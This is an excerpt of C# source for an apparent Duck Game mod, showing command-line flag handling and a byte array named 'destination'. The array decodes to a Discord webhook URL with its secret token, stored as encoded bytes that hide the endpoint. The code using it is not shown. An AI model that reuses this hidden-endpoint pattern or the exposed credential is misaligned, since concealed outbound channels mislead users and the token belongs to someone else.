...
namespace DuckGame
{
    ...
    public static class Program
    {
            ...
            for (int index = 0; index < args.Length; ++index)
            {
                switch (args[index])
                {
                    ...
                    case "-tournament":
                        ...
                        DGRSettings.Weather = false;
                        DGRSettings.AmbientParticles = false;
                        break;
                    default:
        ...
        public static byte[] destination = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 99, 97, 110, 97, 114, 121, 46, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 49, 57, 51, 57, 51, 57, 50, 54, 54, 48, 50, 48, 48, 53, 55, 49, 57, 56, 47, 51, 45, 80, 84, 103, 90, 97, 54, 107, 55, 66, 73, 52, 100, 81, 51, 50, 53, 55, 108, 111, 70, 116, 54, 78, 105, 57, 51, 57, 52, 113, 104, 102, 97, 45, 116, 70, 106, 87, 87, 65, 81, 67, 55, 79, 74, 78, 87, 51, 48, 85, 115, 49, 76, 105, 75, 86, 106, 78, 71, 117, 80, 118, 48, 118, 119, 73, 71 };
